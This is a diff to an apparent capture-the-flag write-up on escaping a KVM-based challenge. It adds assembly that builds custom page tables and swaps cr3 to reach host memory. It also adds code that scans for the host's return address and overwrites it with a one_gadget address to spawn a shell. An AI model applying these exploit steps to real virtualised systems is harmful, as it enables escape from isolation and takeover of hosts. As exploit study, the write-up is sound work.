@@ -98,9 +98,41 @@ So as I hope you can tell from the above explanation, when trying to access `vir
 
 
 ## Substitude cr3
-So at first glance it may seem that we cannot access the host memory as every time we try to access virtual memory outside of range `[0x0, 0x4000]` we get a segfault as the mapping is missing. But noone told us we cannot change the value of `cr3`! And so we can create our own page tables P4', P3', P2', P1' inside memory range `[0x0, 0x4000]` and make P1 have an entry with value `0x7003`. Finally we can set `cr3` to point to our memory. This way we can legitimaly access such memory. 
+So at first glance it may seem that we cannot access the host memory as every time we try to access virtual memory outside of range `[0x0, 0x4000]` we get a segfault as the mapping is missing. But noone told us we cannot change the value of `cr3`! And so we can create our own page tables P4', P3', P2', P1' inside memory range `[0x0, 0x4000]` and make P1' have an entry with value `0x7003`. Finally we can set `cr3` to point to our memory. This way we can legitimaly access such memory. 
 
+Our code for this part:
+
+```asm
+; Build custom P4', P3', P2', P1' tables.
+mov qword ptr [0x1000], 0x2003
+mov qword ptr [0x2000], 0x3003
+mov qword ptr [0x3000], 0x0003
+mov qword ptr [0x0], 0x3
+mov qword ptr [0x8], 0x7003
+
+mov rax, 0x1000
+mov cr3, rax
+```
+
+And this is how these pages look in memory:
 ![](img/mem1.svg)
+
+## Shell
+Now we can access addresses from `[0x7000-0x8000]` range! So we can try to find return address of host and overwrite it with address found by `one_gadget`. ASLR is enabled, but we can just increase the return address by the required delta. So the last question is how can we find the return address (as the location will slightly change every time). Well, after examing the memory under gdb I've found that the page range `[0x7020, 0x8000]` is filled with 0 values (from memset) and then we have 4 addresses before we reach return address. So we can just scan the memory till we find the first non zero value.</br>
+In our exploit it looks like this:
+```asm
+mov rcx, 0x1028
+look_for_ra:
+    add rcx, 8
+    cmp qword ptr [rcx], 0
+    je look_for_ra
+
+    add rcx, 24
+overwrite_ra:
+    mov rax, qword ptr [rcx]
+    add rax, {delta}
+    mov qword ptr [rcx], rax
+```
 
 ## References
 I) [Using KVM API](https://lwn.net/Articles/658511/)<br>
